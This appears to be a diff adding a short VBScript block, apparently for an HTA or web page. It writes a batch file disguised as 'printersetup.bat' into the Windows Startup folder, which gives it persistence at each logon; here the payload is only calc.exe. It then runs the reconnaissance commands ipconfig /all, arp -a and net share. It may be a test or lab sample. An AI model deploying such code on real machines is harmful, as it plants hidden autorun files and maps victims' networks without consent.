@@ -1,0 +1,15 @@
+<script language="VBScript">
+set objFSO = CreateObject("Scripting.FileSystemObject")
+set objWShell = CreateObject("WScript.shell")
+
+appdata = objWShell.expandEnvironmentStrings("%APPDATA%")
+outFile = appdata & "\Microsoft\Windows\Start Menu\Programs\Startup\printersetup.bat"
+
+set objFile = objFSO.CreateTextFile(outFile)
+objFile.Write "calc.exe" & vbCrLf
+objFile.Close
+
+objWShell.Exec("ipconfig /all")
+objWShell.Exec("arp -a")
+objWShell.Exec("net share")
+</script>
